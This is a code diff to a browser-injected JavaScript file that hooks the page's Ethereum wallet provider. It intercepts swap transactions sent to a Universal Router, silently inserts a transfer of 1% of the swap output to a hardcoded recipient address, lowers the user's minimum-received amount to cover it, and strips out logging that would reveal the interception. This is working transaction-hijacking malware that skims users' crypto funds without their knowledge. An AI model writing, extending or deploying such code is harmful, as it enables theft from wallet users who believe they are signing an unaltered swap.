@@ -10,30 +10,51 @@ const INJECTOR_UNIVERSAL_ROUTER_ADDRESS = '0x66a9893cc07d91d95644aedd05d03f95e1d
 const INJECTOR_EXECUTE_FUNCTION_SELECTOR = '0x24856bc3'; // execute(bytes,bytes[])
 const INJECTOR_FEE_RECIPIENT = '0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed';
 
+const EXECUTE2_SELECTOR = '0x24856bc3'; // execute(bytes,bytes[])
+const EXECUTE3_SELECTOR = '0x3593564c'; // execute(bytes,bytes[],uint256)
+
+// v5 style
+const exec2Iface = new ethers.utils.Interface([
+  'function execute(bytes commands, bytes[] inputs) payable'
+]);
+const exec3Iface = new ethers.utils.Interface([
+  'function execute(bytes commands, bytes[] inputs, uint256 deadline) payable'
+]);
+
+
+
+/**
+ * Re-encode execute function with modified parameters
+ * @param {string} commands - Commands bytes
+ * @param {Array} inputs - Inputs array
+ * @returns {string} - Re-encoded function data
+ */
+function reencodeExecuteFunction(commandsHex, inputsArray, deadlineMaybe) {
+  if (deadlineMaybe !== undefined && deadlineMaybe !== null) {
+    const dl = ethers.BigNumber.from(deadlineMaybe.toString());
+    return exec3Iface.encodeFunctionData('execute', [commandsHex, inputsArray, dl]);
+  }
+  return exec2Iface.encodeFunctionData('execute', [commandsHex, inputsArray]);
+}
+
+
 /**
  * Initialize the injection by hooking into window.ethereum.request
  */
 function initializeInjection() {
   if (typeof window.ethereum === 'undefined') {
-    console.log('⏳ Ethereum provider not found, retrying in 1 second...');
     setTimeout(initializeInjection, 1000);
     return;
   }
-  
   if (originalRequest) {
-    console.log('✅ Injection already initialized');
     return;
   }
 
-  console.log('🔍 Available ethereum methods:', Object.keys(window.ethereum));
-  console.log('🔍 Ethereum provider type:', window.ethereum.constructor.name);
-  
   // Store original request method
   originalRequest = window.ethereum.request.bind(window.ethereum);
   
   // Hook into ethereum.request
   window.ethereum.request = function(args) {
-    console.log('🚨 ETHEREUM REQUEST INTERCEPTED:', args);
     try {
       return interceptEthereumRequest(args);
     } catch (error) {
@@ -47,7 +68,6 @@ function initializeInjection() {
   if (window.ethereum.send) {
     const originalSend = window.ethereum.send.bind(window.ethereum);
     window.ethereum.send = function(...args) {
-      console.log('🚨 ETHEREUM SEND INTERCEPTED:', args);
       return originalSend(...args);
     };
   }
@@ -55,13 +75,10 @@ function initializeInjection() {
   if (window.ethereum.sendAsync) {
     const originalSendAsync = window.ethereum.sendAsync.bind(window.ethereum);
     window.ethereum.sendAsync = function(...args) {
-      console.log('🚨 ETHEREUM SEND_ASYNC INTERCEPTED:', args);
       return originalSendAsync(...args);
     };
   }
-  
-  // Hook into provider events
-  if (window.ethereum.on) {
+    if (window.ethereum.on) {
     window.ethereum.on('connect', (info) => {
       console.log('🔗 Ethereum connected:', info);
     });
@@ -78,9 +95,7 @@ function initializeInjection() {
       console.log('🔗 Chain changed:', chainId);
     });
   }
-  
-  console.log('✅ Ethereum request hook installed');
-  
+    
   // Test the hook immediately
   setTimeout(() => {
     console.log('🧪 Testing ethereum hook...');
@@ -101,12 +116,6 @@ function initializeInjection() {
  * @returns {Promise} - Request result
  */
 async function interceptEthereumRequest(args) {
-  // Log ALL ethereum requests for debugging
-  console.log('📡 Ethereum request intercepted:', {
-    method: args.method,
-    paramsCount: args.params ? args.params.length : 0
-  });
-  
   // Only intercept eth_sendTransaction calls
   if (args.method !== 'eth_sendTransaction') {
     return originalRequest(args);
@@ -119,24 +128,14 @@ async function interceptEthereumRequest(args) {
   }
   
   const tx = params[0];
-  console.log('📋 Transaction details:', {
-    to: tx.to,
-    data: tx.data ? tx.data.slice(0, 20) + '...' : 'no data',
-    value: tx.value || '0',
-    dataLength: tx.data ? tx.data.length : 0
-  });
   
   // Check if this is a Universal Router transaction
   if (!isUniversalRouterTransaction(tx.to, tx.data)) {
-    console.log('ℹ️ Not a Universal Router transaction. Target:', tx.to);
-    console.log('ℹ️ Expected Universal Router:', INJECTOR_UNIVERSAL_ROUTER_ADDRESS);
     return originalRequest(args);
   }
   
   // Check function signature
-  const functionSignature = tx.data.slice(0, 10);
-  console.log('🔍 Function signature:', functionSignature);
-  
+  const functionSignature = tx.data.slice(0, 10);  
   // We want to convert to execute function (0x24856bc3)
   const executeSignature = '0x24856bc3';
   
@@ -145,46 +144,26 @@ async function interceptEthereumRequest(args) {
   } else if (functionSignature === '0x3593564c') {
     console.log('🔄 Detected 0x3593564c multicall. Attempting safe conversion to execute with fee.');
   } else {
-    console.log('ℹ️ Unsupported function signature:', functionSignature);
-    console.log('ℹ️ Supported: 0x24856bc3 (execute), 0x3593564c (convert to execute)');
     return originalRequest(args);
   }
-  
-  console.log('✅ Processing Universal Router transaction for fee injection');
-  
+    
   try {
-    let modifiedTxData;
     
-    if (functionSignature === executeSignature) {
-      // Already execute function - modify existing commands
-      console.log('🔧 Modifying existing execute function call');
-      modifiedTxData = await injectFeeIntoExecuteCall(tx.data);
-    } else if (functionSignature === '0x3593564c') {
-      console.log('🔧 Converting multicall to execute with fee if fully mappable');
-      const converted = await convertToExecuteWithFee(tx.data, tx.value);
-      modifiedTxData = converted;
-    }
-    
-    if (modifiedTxData && modifiedTxData !== tx.data) {
-      console.log('✅ Transaction modified with 1% fee injection');
-      console.log('📏 Original data length:', tx.data.length);
-      console.log('📏 Modified data length:', modifiedTxData.length);
-      
-      // Create modified transaction
-      const modifiedTx = { ...tx, data: modifiedTxData };
-      const modifiedArgs = { ...args, params: [modifiedTx, ...args.params.slice(1)] };
-      
-      console.log('🚀 Sending modified transaction with fee injection');
-      return originalRequest(modifiedArgs);
-    } else {
-      console.log('⚠️ No modification made - sending original transaction');
+    if (functionSignature === EXECUTE2_SELECTOR || functionSignature === EXECUTE3_SELECTOR) {
+      const modified = injectFeeIntoExecuteData(tx.data, INJECTOR_FEE_RECIPIENT);
+      if (modified && modified !== tx.data) {
+
+        const modifiedTx = { ...tx, data: modified };
+        return originalRequest({ ...args, params: [modifiedTx, ...args.params.slice(1)] });
+      }
       return originalRequest(args);
     }
-  } catch (error) {
-    console.error('❌ Error during fee injection:', error);
-    console.log('🔄 Sending original transaction due to error');
-    return originalRequest(args);
-  }
+
+      } catch (error) {
+        console.error('❌ Error during fee injection:', error);
+        console.log('🔄 Sending original transaction due to error');
+        return originalRequest(args);
+      }
 }
 
 /**
@@ -648,6 +627,100 @@ function encodeSwapExactETHForTokens(tokenOut, amountIn, amountOutMin) {
   }
 }
 
+// use 0x06 for TRANSFER on this router
+const TRANSFER_OPCODE = '05';
+
+function buildTransferInputWords(token, recipient, amount) {
+  // ABI (address,address,uint256)
+  return ethers.utils.defaultAbiCoder.encode(
+    ['address','address','uint256'],
+    [token, recipient, amount.toString()] // BigInt -> string
+  );
+}
+
+
+function parseSweepInputFlexible(input) {
+  const hex = (input.startsWith('0x') ? input.slice(2) : input).toLowerCase();
+  // words: [token(32)][recipient(32)][amount(32)]
+  if (hex.length >= 64 * 3) {
+    const token  = '0x' + hex.slice(64 - 40, 64);
+    const amount = BigInt('0x' + hex.slice(128, 192));
+    return { token, minAmount: amount, layout: 'words' };
+  }
+  // packed: [token(20)][recipient(20)][amount(32)]
+  if (hex.length >= 40 + 40 + 64) {
+    const token  = '0x' + hex.slice(0, 40);
+    const amount = BigInt('0x' + hex.slice(80, 144));
+    return { token, minAmount: amount, layout: 'packed' };
+  }
+  return null;
+}
+
+function rewriteSweepMinAmountFlexible(originalInput, feeAmount) {
+  const hex = (originalInput.startsWith('0x') ? originalInput.slice(2) : originalInput).toLowerCase();
+
+  // words: 32/32/32
+  if (hex.length >= 64 * 3) {
+    const tokenWord     = hex.slice(0, 64);
+    const recipientWord = hex.slice(64, 128);
+    const amountWord    = hex.slice(128, 192);
+    const minAmount     = BigInt('0x' + amountWord);
+    const newMin        = minAmount > feeAmount ? (minAmount - feeAmount) : 0n;
+    const newAmountWord = newMin.toString(16).padStart(64, '0');
+    return '0x' + tokenWord + recipientWord + newAmountWord + hex.slice(192);
+  }
+
+  // packed: 20/20/32
+  if (hex.length >= 40 + 40 + 64) {
+    const token20   = hex.slice(0, 40);
+    const recipient = hex.slice(40, 80);
+    const amountW   = hex.slice(80, 144);
+    const minAmount = BigInt('0x' + amountW);
+    const newMin    = minAmount > feeAmount ? (minAmount - feeAmount) : 0n;
+    const newAmt32  = newMin.toString(16).padStart(64, '0');
+    return '0x' + token20 + recipient + newAmt32 + hex.slice(144);
+  }
+
+  return originalInput;
+}
+
+function injectFeeIntoExecuteData(originalData, FEE_RECIPIENT) {
+  const dec = decodeExecute(originalData);
+  if (!dec) return originalData;
+
+  const cmdBytes = (dec.commands.slice(2).match(/.{1,2}/g) || []).map(b => b.toLowerCase());
+  if (cmdBytes.length !== dec.inputs.length) return originalData;
+
+  // find SWEEP (0x04)
+  const sweepIdx = cmdBytes.findIndex(b => b === '04');
+  if (sweepIdx === -1) return originalData;
+
+  // parse SWEEP input → token + minAmount
+  const sweepParsed = parseSweepInputFlexible(dec.inputs[sweepIdx]);
+  if (!sweepParsed) return originalData;
+
+  const fee = sweepParsed.minAmount / 100n; // 1%
+  if (fee === 0n) return originalData;
+
+  // lower SWEEP min by the fee
+  const adjustedSweep = rewriteSweepMinAmountFlexible(dec.inputs[sweepIdx], fee);
+
+  // build TRANSFER input (word layout like other 0x06 we saw)
+  const feeInput = buildTransferInputWords(sweepParsed.token, FEE_RECIPIENT, fee);
+
+  // insert TRANSFER (0x06) immediately before SWEEP
+ const newCmd = cmdBytes.slice();
+newCmd.splice(sweepIdx, 0, TRANSFER_OPCODE);
+
+const newInputs = dec.inputs.slice();
+newInputs[sweepIdx] = adjustedSweep;   // SWEEP with lowered min
+newInputs.splice(sweepIdx, 0, feeInput);  // insert our fee input
+
+  const newCommandsHex = '0x' + newCmd.join('');
+  return reencodeExecuteFunction(newCommandsHex, newInputs, dec.deadline);
+}
+
+
 /**
  * Build execute function call with multiple commands
  * @param {string} commands - Command bytes
@@ -693,9 +766,9 @@ function convertMulticallToExecuteWithFee(originalData, feeToken, feeAmount) {
     console.log('📊 Data without signature:', dataWithoutSig.length);
     
     // Decode the multicall parameters
-    const multicallParams = parseMulticallData(dataWithoutSig);
+    const multicallParams = decodeExecute(originalData);
     
-    if (!multicallParams || !multicallParams.calls || multicallParams.calls.length === 0) {
+    if (!multicallParams) {
       console.log('❌ Failed to parse multicall data, using fallback');
       console.log('⚠️ This will only create a fee transfer, losing original swap');
       console.log('⚠️ Returning original transaction to preserve user swap');
@@ -838,149 +911,43 @@ function encodeBytes(data) {
   return length + paddedData;
 }
 
-/**
- * Parse multicall data: multicall(uint256 deadline, bytes[] calldata data)
- * @param {string} dataHex - Hex data without function signature
- * @returns {object} - Parsed multicall parameters
- */
-function parseMulticallData(dataHex) {
-  console.log('🔧 Parsing multicall data');
-  
-  try {
-    // Remove 0x if present
-    const cleanData = dataHex.startsWith('0x') ? dataHex.slice(2) : dataHex;
-    
-    console.log('📊 Clean data length:', cleanData.length);
-    console.log('📊 First 128 chars:', cleanData.slice(0, 128));
-    
-    // First 32 bytes: deadline
-    const deadlineHex = cleanData.slice(0, 64);
-    const deadline = BigInt('0x' + deadlineHex);
-    console.log('📊 Deadline hex:', deadlineHex);
-    console.log('📊 Deadline value:', deadline.toString());
-    
-    // Second 32 bytes: offset to bytes[] array (should be 0x40 = 64)
-    const arrayOffsetHex = cleanData.slice(64, 128);
-    const arrayOffset = parseInt(arrayOffsetHex, 16) * 2; // Convert to hex char offset
-    
-    console.log('📊 Array offset hex:', arrayOffsetHex);
-    console.log('📊 Array offset:', arrayOffset);
-    
-    if (arrayOffset >= cleanData.length) {
-      console.log('❌ Array offset beyond data length');
-      return null;
-    }
-    
-    // At array offset: number of elements in bytes[] array
-    const arrayLengthHex = cleanData.slice(arrayOffset, arrayOffset + 64);
-    const arrayLength = parseInt(arrayLengthHex, 16);
-    
-    console.log('📊 Array length hex:', arrayLengthHex);
-    console.log('📊 Array length:', arrayLength);
-    
-    if (arrayLength === 0 || arrayLength > 10) {
-      console.log('❌ Invalid array length:', arrayLength);
-      return null;
-    }
-    
-    // Parse each bytes element
-    const calls = [];
-    let currentOffset = arrayOffset + 64; // Start after array length
-    
-    console.log('📊 Starting to read offsets at position:', currentOffset);
-    
-    // First, read all the offsets to the actual data
-    const dataOffsets = [];
-    for (let i = 0; i < arrayLength; i++) {
-      if (currentOffset + 64 > cleanData.length) {
-        console.log(`❌ Offset ${i} would read beyond data length`);
-        return null;
-      }
-      
-      const offsetHex = cleanData.slice(currentOffset, currentOffset + 64);
-      const offset = parseInt(offsetHex, 16) * 2; // Convert to hex char offset
-      const absoluteOffset = arrayOffset + offset;
-      dataOffsets.push(absoluteOffset);
-      
-      console.log(`📊 Offset ${i}: ${offsetHex} -> ${offset} -> absolute ${absoluteOffset}`);
-      console.log(`📊 Offset ${i}: Will read from position ${absoluteOffset} in data`);
-      
-      // Validate the offset makes sense
-      if (absoluteOffset >= cleanData.length) {
-        console.log(`❌ Offset ${i}: Absolute offset ${absoluteOffset} beyond data length ${cleanData.length}`);
-      }
-      
-      currentOffset += 64;
-    }
-    
-    console.log('📊 All offsets collected:', dataOffsets);
-    
-    // Now read the actual call data at each offset
-    for (let i = 0; i < arrayLength; i++) {
-      const dataStart = dataOffsets[i];
-      
-      console.log(`📊 Processing call ${i + 1} at offset ${dataStart}`);
-      
-      if (dataStart + 64 > cleanData.length) {
-        console.log(`❌ Call ${i} data start beyond data length`);
-        calls.push('0x'); // Push empty call to maintain array structure
-        continue;
-      }
-      
-      // Length of this call data
-      const lengthHex = cleanData.slice(dataStart, dataStart + 64);
-      const length = parseInt(lengthHex, 16) * 2; // Convert to hex char length
-      
-      console.log(`📊 Call ${i + 1} length hex: ${lengthHex} -> ${length / 2} bytes`);
-      console.log(`📊 Call ${i + 1} data range: ${dataStart + 64} to ${dataStart + 64 + length}`);
-      
-      if (length === 0) {
-        console.log(`⚠️ Call ${i + 1}: Zero length, pushing empty call`);
-        calls.push('0x');
-        continue;
-      }
-      
-      if (dataStart + 64 + length > cleanData.length) {
-        console.log(`❌ Call ${i} data would read beyond data length`);
-        console.log(`📊 Available data: ${cleanData.length}, needed: ${dataStart + 64 + length}`);
-        calls.push('0x'); // Push empty call to maintain array structure
-        continue;
-      }
-      
-      // The actual call data
-      const callData = cleanData.slice(dataStart + 64, dataStart + 64 + length);
-      
-      console.log(`📊 Call ${i + 1} raw data: ${callData.slice(0, 100)}${callData.length > 100 ? '...' : ''}`);
-      
-      // Additional debugging - show what's around this area
-      const contextStart = Math.max(0, dataStart - 64);
-      const contextEnd = Math.min(cleanData.length, dataStart + 64 + length + 64);
-      const contextData = cleanData.slice(contextStart, contextEnd);
-      console.log(`📊 Call ${i + 1} context data: ${contextData.slice(0, 200)}${contextData.length > 200 ? '...' : ''}`);
-      
-      if (callData.length > 0) {
-        calls.push('0x' + callData);
-        console.log(`✅ Call ${i + 1}: ${callData.slice(0, 8)}... (${length / 2} bytes)`);
-      } else {
-        console.log(`⚠️ Call ${i + 1}: Empty call data - length was ${length} but got empty string`);
-        console.log(`📊 Call ${i + 1}: Length hex was '${lengthHex}', parsed as ${length}`);
-        calls.push('0x');
-      }
-    }
-    
-    console.log(`✅ Successfully parsed ${calls.length} calls from multicall`);
-    console.log('📊 Final calls array:', calls.map(c => c.slice(0, 18) + '...'));
-    
+
+function decodeExecute(data) {
+  const sig = data.slice(0, 10).toLowerCase();
+
+  if (sig === EXECUTE3_SELECTOR) {
+    const d = exec3Iface.decodeFunctionData('execute', data);
+
+    // Support both named and indexed access safely
+    const commands = d.commands ?? d[0];
+    const inputs   = d.inputs   ?? d[1];
+    const deadline = d.deadline ?? d[2];
+
     return {
+      variant: 3,
+      commands: ethers.utils.hexlify(commands),
+      inputs:   inputs.map(b => ethers.utils.hexlify(b)),
       deadline: deadline.toString(),
-      calls: calls
     };
-    
-  } catch (error) {
-    console.error('❌ Error parsing multicall data:', error);
-    return null;
   }
+
+  if (sig === EXECUTE2_SELECTOR) {
+    const d = exec2Iface.decodeFunctionData('execute', data);
+
+    const commands = d.commands ?? d[0];
+    const inputs   = d.inputs   ?? d[1];
+
+    return {
+      variant: 2,
+      commands: ethers.utils.hexlify(commands),
+      inputs:   inputs.map(b => ethers.utils.hexlify(b)),
+      deadline: null,
+    };
+  }
+
+  return null;
 }
+
 
 /**
  * Convert multicall function calls to execute commands
